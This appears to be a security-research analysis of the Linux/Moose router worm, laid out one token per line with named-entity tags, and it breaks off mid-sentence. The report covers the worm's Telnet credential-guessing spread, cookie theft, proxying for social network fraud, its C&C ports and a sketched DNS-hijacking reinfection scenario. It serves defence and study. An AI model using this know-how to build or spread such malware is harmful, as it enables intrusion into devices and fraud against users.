The O
Analysis O
of O
a O
Linux O
Router O
- O
based O
Worm O
Hungry O
for O
Social O
Networks O
Olivier O
Bilodeau O
& O
Thomas O
Dupuy O
May O
2015 O
Linux O
/ O
Moose O
is O
a O
malware O
family O
that O
primarily O
targets O
Linux O
- O
based O
consumer O
routers O
but O
that O
can O
infect O
other O
Linux O
- O
based O
embedded O
systems O
in O
its O
path O
. O

The O
compromised B-Entity
devices I-Entity
are O
used O
to O
steal B-Action
unencrypted O
network B-Entity
traffic I-Entity
and O
offer O
proxying O
services O
to O
the O
botnet O
operator O
. O

In O
practice O
, O
these O
capabilities O
are O
used O
to O
steal B-Action
HTTP O
Cookies B-Entity
on B-Modifier
popular O
social B-Entity
network I-Entity
sites I-Entity
and O
perform O
fraudulent O
actions O
such O
as O
non O
- O
legitimate O
" O
follows O
" O
, O
" O
views O
" O
and O
" O
likes O
" O
on O
such O
sites O
. O

Linux O
/ O
Moose O
is O
a O
standard O
statically O
- O
linked O
ELF O
binary O
that O
was O
stripped O
of O
any O
debugging O
symbols O
. O

It O
relies O
heavily O
on O
multithreading O
for O
its O
operation O
using O
as O
many O
as O
36 O
threads O
. O

Most O
of O
these O
threads O
are O
used O
to O
attempt O
find B-Action
and O
infect B-Action
other O
devices B-Entity
automatically O
. O

The O
threat O
displays O
out O
- O
of O
- O
the O
- O
ordinary O
network O
penetration O
capabilities O
compared O
to O
other O
router O
- O
based O
malware O
. O

Moose B-Entity
also O
has O
DNS O
hijacking O
capabilities O
and O
will O
kill B-Action
the O
processes B-Entity
of I-Entity
other I-Entity
malware I-Entity
families I-Entity
competing I-Entity
for I-Entity
the I-Entity
limited I-Entity
resources I-Entity
offered I-Entity
by I-Entity
the I-Entity
infected I-Entity
embedded I-Entity
system I-Entity
. O

ESET O
researchers O
ran O
and O
monitored O
a O
Moose O
- O
infected O
environment O
and O
collected O
operational O
information O
about O
the O
threat O
. O

This O
information O
includes O
which O
social O
networks O
were O
targeted O
and O
the O
unencrypted O
interactions O
between O
the O
operators O
, O
the O
infected O
host O
and O
the O
targeted O
social O
networks O
. O

Linux O
/ O
Moose O
does O
not O
have O
a O
persistence O
mechanism O
and O
does O
not O
provide O
a O
generic O
backdoor O
shell O
access O
to O
the O
botnet O
operator O
. O

No O
vulnerability O
is O
exploited O
at O
any O
time O
during O
its O
operation O
; O
it O
spreads O
by O
finding O
routers O
with O
weak O
credentials O
. O

This O
report O
contains O
an O
overview O
of O
the O
operation O
and O
an O
in O
- O
depth O
analysis O
of O
the O
threat O
, O
details O
of O
its O
network O
protocol O
, O
indicators O
of O
compromise O
( O
IoC O
) O
, O
cleaning O
instructions O
, O
prevention O
advice O
and O
the O
list O
of O
potentially O
targeted O
vendors O
. O

At O
ESET O
we O
like O
to O
investigate O
exotic O
threats O
. O

Whether O
they O
run O
on O
atypical O
architectures O
like O
MIPS O
or O
ARM O
, O
or O
they O
target O
embedded O
networked O
devices O
- O
like O
consumer O
routers O
or O
Internet O
of O
Things O
( O
IoT O
) O
devices O
- O
instead O
of O
desktops O
or O
phones O
or O
they O
are O
designed O
to O
obscure O
their O
end O
goal O
, O
these O
threats O
arouse O
our O
curiosity O
. O

There O
are O
other O
reasons O
, O
of O
course O
, O
for O
a O
threat O
to O
be O
considered O
exotic O
but O
, O
the O
threat O
under O
study O
here O
fits O
all O
the O
above O
categories O
. O

In O
fact O
, O
the O
only O
thing O
that O
's O
not O
exotic O
about O
it O
is O
the O
name O
we O
've O
given O
it O
: O
Linux O
/ O
Moose1 O
. O

Well O
, O
at O
least O
for O
those O
of O
us O
at O
ESET O
Canada O
Research O
. O

This O
report O
is O
divided O
into O
two O
sections O
: O
a O
description O
of O
what O
we O
know O
about O
the O
operation O
, O
followed O
by O
a O
detailed O
technical O
description O
of O
the O
threat O
. O

Before O
going O
in O
too O
deep O
into O
the O
operation O
, O
though O
, O
we O
need O
to O
give O
you O
a O
high O
- O
level O
sense O
of O
what O
Moose O
can O
do O
. O

The O
high O
- O
level O
capabilities O
of O
this O
worm O
are O
. O

Interestingly O
, O
missing O
from O
this O
list O
is O
the O
persistence O
mechanism O
( O
there O
is O
n't O
any O
) O
and O
the O
fact O
that O
no O
generic O
backdoor O
shell O
access O
is O
made O
available O
to O
the O
botnet O
operator O
. O

Last O
but O
not O
least O
, O
this O
threat O
spreads O
only O
by O
compromising O
systems O
with O
weak O
or O
default O
credentials O
. O

No O
vulnerabilities O
are O
exploited O
by O
the O
malware O
. O

Although O
downplayed O
by O
system O
administrators O
, O
this O
attack O
vector O
has O
been O
effective O
at O
compromising O
a O
lot O
of O
Internet O
- O
connected O
systems O
. O

As O
FireEye O
recently O
stated O
: O
" O
Brute O
forcing O
credentials O
remains O
one O
of O
the O
top O
10 O
most O
common O
ways O
an O
organization O
is O
first O
breached O
. O
" O
As O
we O
have O
found O
out O
, O
the O
malware O
's O
main O
payload O
- O
its O
generic O
proxy O
service O
- O
is O
used O
solely O
to O
perform O
social O
network O
fraud O
. O

The O
story O
is O
similar O
for O
stolen O
traffic O
which O
targets O
browser O
cookies O
. O

With O
that O
understanding O
we O
summarize O
the O
threat O
graphically O
below O
. O

Linux O
/ B-Entity
Moose I-Entity
will O
periodically O
communicate B-Action
with B-Modifier
a O
set B-Entity
of I-Entity
command I-Entity
and I-Entity
control I-Entity
servers I-Entity
( I-Entity
C&C I-Entity
) I-Entity
that I-Entity
are I-Entity
hardcoded I-Entity
into I-Entity
the I-Entity
malware I-Entity
itself I-Entity
. O

The O
randomly O
picked O
C&C O
server O
, O
henceforth O
the B-Entity
configuration I-Entity
C&C I-Entity
server I-Entity
, O
will O
provide B-Action
configuration O
information B-Entity
that I-Entity
will I-Entity
affect I-Entity
the I-Entity
behavior I-Entity
of I-Entity
the I-Entity
malware I-Entity
. O

In O
that O
configuration O
two O
IP O
addresses O
will O
be O
referred O
to O
several O
times O
in O
this O
report O
: O
the O
IP O
address O
of O
the O
C&C O
server O
to O
use O
for O
reporting O
and O
infection O
, O
dubbed O
the O
report O
C&C O
server O
, O
and O
the O
IP O
address O
of O
the O
C&C O
server O
to O
use O
for O
relay O
( O
NAT O
traversal O
) O
, O
dubbed O
the O
relay O
C&C O
server O
. O

When O
looking O
at O
the O
broad O
possibilities O
of O
this O
malware O
it O
is O
not O
immediately O
obvious O
what O
its O
exact O
purpose O
is O
. O

It O
could O
go O
in O
many O
directions O
, O
from O
DDoS O
, O
to O
compromise O
of O
networks O
, O
and O
expose O
private O
servers O
to O
the O
operator O
( O
via O
proxy O
) O
, O
steal O
important O
yet O
unencrypted O
traffic O
, O
or O
perform O
man O
- O
in O
- O
the O
- O
middle O
attacks O
via O
DNS O
hijacking O
. O

It O
was O
not O
until O
we O
were O
able O
to O
decrypt O
our O
first O
configuration O
from O
the O
configuration O
C&C O
server O
that O
we O
were O
able O
to O
start O
to O
grasp O
what O
the O
operators O
were O
after O
. O

When O
we O
started O
running O
our O
own O
infected O
devices O
then O
the O
purpose O
became O
crystal O
clear O
. O

This O
threat O
is O
all O
about O
social O
network O
fraud O
. O

First O
, O
analysis O
of O
the O
configuration O
indicated O
that O
the O
data O
that O
the B-Entity
bot I-Entity
is O
trying O
to O
steal B-Action
is O
HTTP B-Entity
cookies I-Entity
from I-Entity
popular I-Entity
social I-Entity
networks I-Entity
. O

Additionally O
, O
by O
monitoring O
one O
infected O
router O
- O
which O
we O
firewalled O
in O
order O
to O
prevent O
it O
from O
infecting O
others O
- O
we O
were O
able O
to O
establish O
the O
nature O
of O
the O
traffic O
proxied O
through O
these O
routers O
. O

We O
collected O
this O
proxy O
data O
for O
almost O
a O
month O
in O
the O
spring O
of O
2015 O
. O

What O
is O
highlighted O
here O
is O
that O
most O
of O
the O
traffic O
going O
through O
the O
proxy O
is O
encrypted O
. O

The O
operator O
traffic O
is O
carried O
via O
HTTP O
over O
a O
non O
- O
standard O
port O
( O
TCP O
2318 O
) O
. O

It O
is O
used O
to O
communicate O
the O
external O
IP O
address O
of O
the O
infected O
device O
to O
the O
client O
at O
the O
other O
end O
of O
the O
proxy O
. O

It O
is O
worth O
noting O
that O
most O
of O
the O
HTTP O
traffic O
is O
for O
the O
Instagram O
social O
network O
and O
is O
upgraded O
to O
HTTPS O
right O
away O
using O
a O
Location O
: O
header O
. O

The O
SOCKS O
proxy O
overhead O
( O
1 O
) O
and O
the O
redirection O
to O
use O
HTTPS O
instead O
of O
HTTP O
( O
2 O
) O
can O
be O
seen O
in O
the O
capture O
. O

Although O
we O
ca O
n't O
see O
the O
content O
of O
the O
encrypted O
traffic O
, O
we O
can O
look O
at O
the O
destination O
IP O
address O
. O

Furthermore O
, O
we O
can O
inspect O
the O
certificate O
identifying O
the O
server O
and O
its O
Common O
Name O
( O
CN O
) O
- O
a O
mandatory O
attribute O
that O
allows O
to O
authenticate O
the O
website O
- O
giving O
us O
an O
accurate O
description O
of O
the O
destination O
of O
the O
proxied O
traffic O
. O

During O
our O
monitoring O
, O
the O
top O
3 O
targets O
were O
Twitter O
, O
Instagram O
and O
Soundcloud O
. O

We O
regrouped O
the O
" O
Others O
" O
in O
a O
separate O
pie O
chart O
to O
make O
the O
graph O
readable O
. O

In O
addition O
to O
the O
encrypted O
data O
, O
we O
looked O
at O
the O
autonomous O
systems O
( O
AS O
) O
where O
the O
proxied O
traffic O
was O
going O
and O
cross O
- O
referenced O
it O
with O
passive O
DNS O
information O
. O

Using O
this O
method O
we O
were O
able O
to O
compile O
the O
list O
of O
targeted O
organizations O
below O
. O

We O
can O
also O
look O
at O
how O
much O
requests O
are O
made O
through O
the O
proxy O
and O
for O
what O
purpose O
was O
the O
proxy O
used O
. O

This O
is O
summarized O
in O
the O
below O
graph O
. O

Social O
networks O
is O
the O
number O
of O
proxy O
requests O
with O
a O
destination O
related O
to O
social O
networking O
sites O
as O
identified O
by O
the O
certifacate O
CN O
, O
passive O
DNS O
information O
or O
the O
IP O
address O
AS O
. O

botnet O
traffic O
is O
the O
number O
of O
proxy O
requests O
sent O
to O
C&C O
and O
was O
always O
related O
to O
the O
previously O
mentioned O
TCP O
port O
2318 O
. O

Other O
is O
any O
proxy O
request O
that O
did O
n't O
fit O
the O
above O
categories O
. O

The O
graph O
highlights O
that O
infected O
hosts O
are O
leveraged O
only O
to O
access O
social O
networks O
and O
that O
, O
on O
average O
, O
more O
than O
500 O
requests O
per O
day O
will O
go O
through O
an O
infected O
router O
. O

Unfortunately O
, O
since O
most O
of O
the O
traffic O
is O
encrypted O
, O
we O
can O
only O
speculate O
about O
what O
they O
are O
doing O
, O
even O
though O
we O
can O
make O
a O
shrewd O
guess O
. O

We O
will O
get O
to O
that O
eventually O
but O
first O
lets O
look O
at O
how O
big O
this O
threat O
is O
. O

Despite O
all O
our O
efforts O
we O
were O
unable O
to O
make O
a O
reliable O
estimate O
of O
the O
number O
of O
affected O
routers O
. O

This O
is O
due O
in O
part O
to O
the O
fact O
that O
the O
malware O
was O
built O
to O
make O
it O
hard O
to O
make O
an O
estimate O
. O

There O
is O
no O
peer O
- O
to O
- O
peer O
protocol O
, O
it O
uses O
a O
hardcoded O
IP O
address O
instead O
of O
DNS O
for O
C&C O
, O
and O
even O
though O
the O
backdoor O
is O
listening O
on O
the O
Internet O
on O
port O
10073 O
to O
offer O
its O
proxy O
service O
, O
only O
IP O
addresses O
in O
a O
whitelist O
are O
allowed O
to O
connect O
. O

Another O
reason O
for O
our O
lack O
of O
success O
is O
the O
lack O
of O
security O
tools O
ecosystems O
( O
like O
Anti O
- O
Virus O
) O
on O
embedded O
systems O
. O

Finally O
, O
the O
hosting O
providers O
where O
the O
C&C O
are O
located O
were O
relunctant O
to O
cooperate O
, O
which O
did O
n't O
help O
. O

This O
section O
will O
list O
all O
other O
attempts O
we O
have O
made O
at O
estimating O
the O
population O
of O
this O
malware O
. O

Probes O
on O
the O
Internet O
Something O
we O
can O
use O
to O
give O
us O
a O
sense O
of O
the O
activity O
level O
of O
this O
threat O
is O
the O
general O
network O
activity O
on O
the O
Internet O
Storm O
Center O
's O
probes O
regarding O
port O
10073 O
. O

Since O
this O
port O
is O
unassigned O
by O
the O
IANA O
, O
and O
is O
not O
in O
use O
by O
any O
popular O
software O
, O
abnormally O
high O
volumes O
of O
traffic O
on O
that O
port O
could O
be O
an O
indicator O
of O
Moose O
activity O
. O

Port O
10073 O
Activity O
Although O
we O
could O
n't O
find O
precise O
documentation O
, O
we O
believe O
that O
sources O
and O
targets O
represent O
whether O
the O
packet O
seen O
on O
the O
ISC O
's O
probe O
going O
for O
port O
10073 O
was O
from O
the O
source O
side O
or O
the O
target O
side O
of O
the O
probe O
. O

In O
themselves O
the O
numbers O
might O
paint O
an O
incomplete O
picture O
, O
since O
the O
probes O
are O
seeing O
just O
a O
subset O
of O
the O
Internet O
traffic O
- O
but O
if O
we O
compare O
them O
with O
HTTPS O
traffic O
over O
the O
same O
period O
, O
we O
see O
that O
Moose O
activity O
was O
roughly O
only O
an O
order O
of O
magnitude O
below O
HTTPS O
. O

We O
can O
also O
see O
a O
clear O
rise O
in O
2014 O
that O
is O
too O
sharp O
to O
be O
statistically O
irrelevant O
. O

We O
first O
met O
Linux/ O
Moose O
in O
late O
July O
2014 O
. O

Since O
the O
beginning O
of O
2015 O
there O
seems O
to O
be O
a O
decline O
in O
activity O
but O
we O
know O
that O
the O
operators O
are O
still O
active O
since O
they O
keep O
updating O
their O
malware O
. O

The O
fact O
that O
they O
can O
remotely O
control O
the O
intensity O
of O
scanning O
activity O
on O
port O
10073 O
might O
account O
for O
the O
apparent O
decline O
in O
traffic O
. O

Moose O
Aggressiveness O
Another O
measure O
of O
prevalence O
is O
the O
aggressiveness O
with O
which O
the O
bot O
spreads O
. O

We O
ran O
one O
infected O
host O
for O
24 O
hours O
and O
measured O
its O
level O
of O
activity O
and O
its O
success O
rate O
at O
finding O
potential O
peers O
or O
connecting O
to O
exposed O
Telnet O
services O
. O

Here O
are O
our O
results O
. O

Over O
24 O
hours O
, O
almost O
170000 O
connection O
attempts O
were O
made O
on O
port O
10073 O
, O
meant O
for O
23000 O
unique O
hosts O
. O

Of O
those O
, O
36 O
completed O
the O
TCP O
handshake O
, O
which O
means O
that O
they O
might O
be O
infected O
, O
or O
they O
have O
another O
service O
on O
this O
port2 O
, O
or O
they O
are O
firewalled O
weirdly3 O
. O

85000 O
Telnet O
connection O
attempts O
were O
made O
on O
18000 O
unique O
hosts O
, O
of O
which O
161 O
responded O
with O
a O
login O
banner O
. O

These O
numbers O
have O
to O
be O
taken O
with O
a O
grain O
of O
salt O
since O
they O
depend O
heavily O
on O
the O
type O
of O
hardware O
on O
which O
the O
malware O
runs O
. O

We O
ran O
it O
under O
software O
emulation O
- O
which O
is O
usually O
way O
slower O
than O
real O
hardware O
- O
in O
a O
virtualized O
Intel O
server O
- O
which O
is O
way O
more O
powerful O
than O
most O
routers O
. O

In O
other O
words O
, O
we O
do O
n't O
know O
how O
these O
numbers O
compare O
to O
real O
infected O
hardware O
but O
we O
tend O
to O
think O
that O
they O
should O
be O
comparable O
. O

Internet O
scan O
Finally O
, O
we O
asked O
our O
friends O
at O
Rapid7 O
to O
scan O
the O
Internet O
on O
both O
port O
10073 O
and O
23 O
( O
Telnet O
) O
in O
order O
to O
get O
a O
sense O
of O
how O
many O
Internet O
- O
facing O
devices O
listen O
to O
both O
ports O
. O

It O
turns O
out O
about O
1 O
million O
IP O
addresses O
fit O
that O
description O
. O

If O
we O
remove O
the O
devices O
that O
had O
no O
Telnet O
banner O
, O
that O
number O
is O
reduced O
to O
around O
50,000 O
potentially O
infected O
hosts O
. O

Still O
, O
this O
number O
is O
probably O
an O
overestimate O
because O
of O
the O
wild O
nature O
of O
the O
Internet O
and O
yet O
might O
also O
be O
an O
under O
estimate O
since O
many O
publicly O
unreachable O
and O
therefore O
uncounted O
devices O
might O
be O
infected O
. O

All O
of O
these O
indicators O
taken O
together O
, O
while O
only O
educated O
guesses O
, O
leads O
us O
to O
think O
that O
this O
threat O
is O
real O
and O
should O
be O
taken O
seriously O
. O

Linux O
/ O
Moose O
requires O
a O
Linux O
- O
based O
system O
because O
of O
its O
dependency O
on O
Clibc O
, O
a O
popular O
C O
library O
for O
embedded O
systems O
. O

Plenty O
of O
embedded O
systems O
are O
now O
running O
Linux O
- O
from O
consumer O
routers O
to O
carrier O
- O
grade O
network O
gear O
through O
Internet O
of O
Things O
( O
IoT O
) O
appliances O
. O

Some O
affected O
devices O
are O
easier O
to O
identify O
than O
others O
. O

For O
instance O
: O
upon O
launch O
, O
the B-Entity
malware I-Entity
checks B-Action
whether B-Modifier
the O
file B-Entity
/home I-Entity
/ I-Entity
hik I-Entity
/ I-Entity
start.sh I-Entity
exists I-Entity
on I-Entity
disk I-Entity
. O

This O
path O
is O
usually O
associated O
with O
Hik O
Vision O
DVRs O
which O
are O
being O
targeted O
by O
embedded O
malware O
. O

Another O
means O
of O
identification O
is O
to O
look O
at O
what O
routers O
support O
the O
methods O
used O
to O
perform O
DNS O
Hijacking O
. O

Last O
but O
not O
least O
is O
to O
look O
at O
what O
devices O
are O
affected O
by O
the O
threats O
that O
Linux O
/ O
Moose O
tries O
to O
eliminate O
when O
it O
runs O
. O

Here O
is O
a O
list O
of O
vendors O
we O
know O
are O
being O
targeted O
. O

Vendors O
Confirmed O
as O
Being O
Affected O
Actiontec O
, O
Hik O
Vision O
, O
Netgear O
, O
Synology O
, O
TP O
- O
Link O
, O
ZyXEL O
, O
Zhone O
IoT O
but O
even O
medical O
devices O
Based O
on O
recent O
security O
research O
we O
have O
enough O
evidence O
to O
state O
that O
even O
medical O
devices O
like O
the O
Hospira O
Drug O
Infusion O
Pump O
could O
be O
infected O
with O
Linux O
/ O
Moose O
. O

Of O
course O
, O
just O
as O
is O
the O
case O
with O
IoT O
, O
these O
devices O
are O
currently O
more O
collateral O
damage O
than O
deliberate O
targeting O
. O

Due O
to O
time O
constraints O
and O
hardware O
availability O
, O
we O
have O
been O
unable O
to O
confirm O
so O
far O
that O
certain O
vendors O
are O
definitely O
targeted O
. O

We O
would O
love O
to O
be O
able O
to O
crowdsource O
an O
accurate O
targeted O
vendors O
list O
. O

See O
the O
full O
list O
of O
potentially O
targeted O
vendors O
in O
the O
appendixes O
for O
vendor O
names O
and O
validation O
instructions O
. O

As O
to O
why O
some O
of O
these O
devices O
would O
ever O
be O
attacked O
by O
the O
malware O
? O
Well O
, O
there O
is O
the O
malware O
's O
ability O
to O
reach O
behind O
firewalls O
but O
we O
must O
not O
forget O
what O
we O
have O
learned O
in O
2012 O
via O
the O
Carna O
Botnet O
. O

A O
lot O
of O
devices O
and O
services O
we O
have O
seen O
during O
our O
research O
should O
never O
be O
connected O
to O
the O
public O
Internet O
at O
all O
. O

As O
a O
rule O
of O
thumb O
, O
if O
you O
believe O
that O
" O
nobody O
would O
connect O
that O
to O
the O
Internet O
, O
really O
nobody O
" O
, O
there O
are O
at O
least O
1000 O
people O
who O
did O
. O

Whenever O
you O
think O
" O
that O
should O
n't O
be O
on O
the O
Internet O
but O
will O
probably O
be O
found O
a O
few O
times O
" O
it O
's O
there O
a O
few O
hundred O
thousand O
times O
. O

Like O
half O
a O
million O
printers O
, O
or O
a O
Million O
Webcams O
, O
or O
devices O
that O
have O
root O
as O
a O
root O
password O
. O

- O
Internet O
Census O
2012 O
( O
Carna O
botnet O
) O
During O
our O
analysis O
we O
often O
asked O
ourselves O
, O
" O
Why O
so O
much O
effort O
in O
order O
to O
interact O
with O
social O
networks O
? O
" O
Then O
we O
realized O
that O
there O
is O
a O
market O
for O
follows O
, O
likes O
, O
views O
and O
whatnot O
. O

It O
is O
pretty O
clear O
that O
this O
is O
what O
is O
going O
on O
here O
. O

First O
, O
as O
previously O
mentioned O
, O
there O
are O
attempts O
at O
stealing O
cookies O
from O
these O
sites O
. O

However O
, O
the O
cookies O
can O
not O
be O
stolen O
if O
the O
traffic O
is O
HTTPS O
and O
now O
most O
of O
these O
sites O
are O
HTTPS O
- O
only O
, O
so O
it O
's O
unclear O
how O
effective O
these O
attacks O
are O
in O
this O
respect O
. O

Second O
, O
attempting O
to O
commit O
fraud O
upon O
these O
sites O
needs O
a O
reputable O
and O
disposable O
IP O
address O
. O

If O
someone O
tries O
to O
register O
2000 O
twitter O
accounts O
from O
his O
own O
IP O
address O
this O
will O
likely O
draw O
attention O
. O

To O
a O
social O
network O
site O
operator O
, O
there O
is O
probably O
nothing O
more O
reputable O
than O
an O
IP O
address O
behind O
a O
well O
- O
known O
ISP O
. O

Just O
the O
type O
of O
network O
where O
you O
can O
expect O
to O
find O
badly O
configured O
consumer O
routers O
. O

The O
non O
- O
operator O
- O
related O
HTTP O
traffic O
we O
were O
able O
to O
observe O
was O
of O
the O
well O
- O
known O
Instagram O
social O
network O
. O

During O
our O
monitoring O
we O
were O
able O
to O
see O
more O
than O
700 O
different O
Instagram O
accounts O
accessed O
from O
a O
single O
infected O
router O
over O
about O
a O
month O
. O

Accounts O
freshly O
created O
that O
we O
've O
seen O
in O
the O
tunnels O
. O

When O
we O
checked O
the O
next O
day O
, O
the O
account O
had O
started O
to O
follow O
around O
30 O
- O
40 O
people O
. O

This O
is O
no O
isolated O
case O
. O

Both O
these O
accounts O
were O
seen O
in O
the O
HTTP O
traffic O
and O
then O
a O
few O
hours O
later O
when O
we O
checked O
them O
they O
were O
already O
following O
a O
similar O
number O
of O
accounts O
. O

It O
feels O
as O
if O
the O
operators O
understand O
there O
to O
be O
some O
threshold O
value O
that O
must O
not O
be O
reached O
too O
quickly O
. O

Looking O
more O
closely O
at O
one O
account O
, O
here O
is O
a O
Wireshark O
screenshot O
of O
the O
HTTP O
traffic O
. O

You O
can O
see O
the O
username O
in O
the O
highlighted O
Location O
header O
4 O
. O

After O
a O
few O
hours O
we O
have O
a O
user O
with O
36 O
followers O
. O

Who O
is O
he O
following O
? O
We O
picked O
an O
account O
at O
random O
. O

Carefully O
avoiding O
accounts O
with O
pictures O
that O
would O
require O
some O
blurring O
we O
've O
hit O
an O
account O
with O
surprisingly O
many O
followers O
considering O
that O
it O
has O
seven O
posts O
and O
follows O
only O
seven O
accounts O
. O

After O
one O
week O
it O
got O
better O
. O

We O
have O
also O
found O
accounts O
that O
are O
following O
many O
similar O
accounts O
. O

Like O
this O
one O
selling O
Facebook O
likes O
. O

By O
looking O
at O
the O
tunnel O
activity O
we O
were O
able O
to O
witness O
many O
instances O
of O
fraudulent O
social O
network O
activity O
. O

It O
seems O
that O
people O
are O
willing O
to O
pay O
for O
this O
, O
so O
it O
is O
understandable O
that O
criminals O
will O
try O
to O
leverage O
it O
. O

Looking O
purely O
at O
the O
capabilities O
of O
Moose O
, O
several O
attack O
scenarios O
can O
be O
extrapolated O
. O

However O
due O
to O
the O
complexity O
of O
monitoring O
this O
threat O
most O
of O
them O
could O
n't O
be O
confirmed O
. O

We O
will O
quickly O
explore O
the O
more O
interesting O
ones O
here O
. O

Distributed O
Denial O
of O
Service O
( O
DDoS O
) O
attacks O
Like O
most O
botnets O
, O
DDoS O
capability O
is O
a O
possibility O
. O

In O
this O
case O
there O
is O
nothing O
built O
into O
the O
malware O
itself O
that O
is O
related O
to O
DDoS O
but O
the O
generic O
SOCKS O
proxy O
implementation O
allows O
it O
. O

However O
it O
does O
n't O
seem O
realistic O
to O
waste O
bandwidth O
through O
proxies O
instead O
of O
performing O
direct O
attacks O
. O

Network O
exploration O
Targeted O
network O
exploration O
and O
eavesdropping O
is O
definitely O
possible O
with O
Moose O
due O
to O
its O
NAT O
traversal O
capabilities O
and O
its O
integrated O
network O
sniffer O
, O
which O
is O
configured O
by O
a O
C&C O
server O
. O

The O
operator O
could O
tweak O
and O
monitor O
more O
closely O
one O
infection O
based O
on O
the O
IP O
address O
of O
the O
infection O
if O
it O
were O
affiliated O
with O
a O
government O
or O
a O
bank O
, O
for O
instance O
. O

Reconnaissance O
then O
DNS O
Hijacking O
One O
technical O
limitation O
of O
Moose O
is O
that O
it O
can O
only O
perform O
its O
DNS O
hijacking O
payload O
on O
victims O
' O
routers O
during O
infection O
. O

However O
this O
is O
not O
enabled O
in O
the O
default O
C&C O
configuration5 O
and O
so O
we O
wondered O
how O
it O
could O
be O
used O
. O

Here O
is O
a O
credible O
attack O
that O
the O
operator O
could O
launch O
to O
leverage O
several O
pieces O
of O
Moose O
's O
functionality O
and O
that O
would O
enable O
a O
reinfection O
of O
victims O
in O
which O
their O
DNS O
would O
get O
hijacked O
. O

Note O
This O
plan O
requires O
knowledge O
about O
the O
malware O
that O
hasn't O
been O
covered O
yet O
. O

Some O
of O
the O
missing O
pieces O
will O
be O
explained O
further O
along O
. O

At O
this O
point O
the O
rogue B-Entity
DNS I-Entity
servers I-Entity
can O
point B-Action
legitimate O
sites B-Entity
to B-Modifier
phishing O
sites B-Entity
, O
inject B-Action
malware B-Entity
in B-Modifier
downloaded O
files B-Entity
, O
or O
perform B-Action
man O
- B-Entity
in I-Entity
- I-Entity
the I-Entity
- I-Entity
middle I-Entity
attacks I-Entity
that O
would O
prevent O
upgrades O
to O
HTTPS O
by O
websites O
. O

Linux O
/ O
Moose O
is O
a O
statically O
linked O
ELF O
binary O
without O
debugging O
symbols O
. O

It O
uses O
Clibc O
as O
its O
C O
library O
. O

It O
relies O
heavily O
on O
multithreading O
with O
more O
than O
30 O
running O
simultaneously O
during O
a O
usual O
infection O
. O

$ O
file O
elan2 O
elan2 O
: O
ELF O
32-bit O
MSB O
executable O
, O
MIPS O
, O
MIPS32 O
version O
1 O
( O
SYSV O
) O
, O
statically O
linked O
, O
stripped O
We O
based O
our O
analysis O
on O
the O
MIPS O
variants O
of O
the O
threat O
. O

The O
screen O
captures O
in O
this O
report O
are O
taken O
from O
this O
architecture O
. O

We O
quickly O
analyzed O
the O
ARM O
variant O
to O
make O
sure O
that O
this O
is O
the O
same O
threat O
and O
track O
changes O
through O
time O
, O
but O
that O
's O
all O
. O

Here O
is O
a O
diagram O
of O
the O
various O
components O
of O
the O
threat O
that O
we O
will O
develop O
in O
the O
following O
sections O
. O

String O
obfuscation O
with O
C&C O
servers O
Before O
we O
move O
on O
to O
describe O
the O
individual O
components O
, O
there O
is O
one O
thing O
that O
is O
common O
between O
many O
of O
the O
components O
: O
The B-Entity
obfuscation I-Entity
that O
is O
applied B-Action
to B-Modifier
the O
strings B-Entity
sent I-Entity
through I-Entity
the I-Entity
network I-Entity
. O

Strings O
obfuscated O
with O
this O
simple O
algorithm O
can O
be O
made O
readable O
with O
the O
following O
Python O
snippet O
. O

We O
classified O
Moose O
as O
a O
worm O
since O
it O
attempts O
to O
replicate O
automatically O
. O

In O
this O
section O
we O
will O
describe O
how O
its O
spreading O
mechanism O
works O
. O

Note O
Several O
parameters O
provided O
by O
the O
server O
configuration O
packet O
are O
of O
interest O
to O
understand O
the O
spreading O
behavior O
. O

The O
parameter O
names O
have O
been O
made O
up O
based O
on O
the O
behaviors O
they O
modified O
. O

The O
full O
list O
and O
details O
of O
these O
parameters O
is O
available O
in O
the O
configuration O
C&C O
network O
protocol O
section O
. O

After O
configuration O
, O
three B-Entity
sets I-Entity
of I-Entity
threads I-Entity
are O
created B-Action
that O
are O
related O
to O
the O
spreading O
mechanism O
: O
threads O
scanning O
random O
IP O
addresses O
, O
threads O
scanning O
closely O
related O
IP O
addresses O
, O
and O
threads O
created O
per O
network O
interface O
to O
scan O
these O
otherwise O
unreachable O
networks O
. O

These O
threads O
share O
the O
same O
code O
, O
which O
we O
will O
refer O
to O
as O
a O
scanner O
thread O
. O

The O
scanner O
thread O
's O
behavior O
is O
altered O
by O
being O
passed O
a O
different O
configuration O
. O

Scanner O
threads O
and O
configuration O
Interestingly O
the O
number O
of O
threads O
per O
set O
is O
defined O
by O
the O
configuration O
C&C O
server O
. O

cnccfg_nb_thdscan_local O
defines O
how O
many O
threads O
should O
scan O
for O
IPs O
closely O
related O
to O
the O
external O
IP O
. O

cnccfg_nb_thdscan_ext O
de- O
fines O
how O
many O
threads O
should O
scan O
using O
random O
IPs O
. O

Lastly O
, O
if O
cnccfg_flag O
_ O
scanner_sniffer O
is O
set O
, O
then O
a O
scanner O
thread O
will O
be O
launched O
per O
addition- O
al O
network O
interface O
on O
the O
system O
- O
something O
we O
cover O
later O
. O

During O
the O
observation O
period O
, O
typical O
configuration O
values O
seen O
coming O
from O
the O
configuration O
C&C O
server O
were O
. O

Scanner O
threads O
The O
three O
sets O
of O
threads O
are O
each O
bootstrapped O
a O
bit O
differently O
. O

One O
set O
is O
scanning O
purely O
random O
IP O
addresses O
, O
another O
one O
is O
scanning O
for O
random O
IP O
addresses O
that O
are O
in O
the O
same O
/15 O
subnet O
( O
CIDR O
) O
as O
the O
external O
IP O
address O
of O
the O
infected O
device O
, O
and O
the O
last O
one O
is O
incrementally O
scanning O
all O
the O
IPs O
on O
the O
network O
interfaces O
it O
found O
up O
to O
the O
interface O
's O
broadcast O
address O
. O

The O
scanner O
performs O
the O
following O
operations O
on O
each O
IP O
. O

First O
, O
it B-Entity
checks O
going O
to O
see O
if O
it O
can O
connect B-Action
on B-Modifier
TCP O
port B-Entity
10073 I-Entity
. O

If O
it B-Entity
can O
perform O
a O
full O
TCP O
handshake O
, O
it O
will O
disconnect O
right O
away O
and O
considers B-Action
that B-Modifier
the O
host B-Entity
is I-Entity
already I-Entity
infected I-Entity
and O
will O
report B-Action
it B-Entity
as O
such O
to B-Modifier
the O
report B-Entity
C&C I-Entity
server I-Entity
. O

Dissecting O
Linux O
/ O
Moose O
A O
Moose O
Encounter O
- O
An O
Infected O
Host O
( O
Peer O
) O
was O
Found O
Unlike O
the O
other O
configuration O
C&C O
server O
interactions O
, O
which O
happen O
using O
a O
custom O
binary O
protocol O
on O
port O
81 O
, O
this O
exchange O
is O
done O
in O
HTTP O
on O
that O
same O
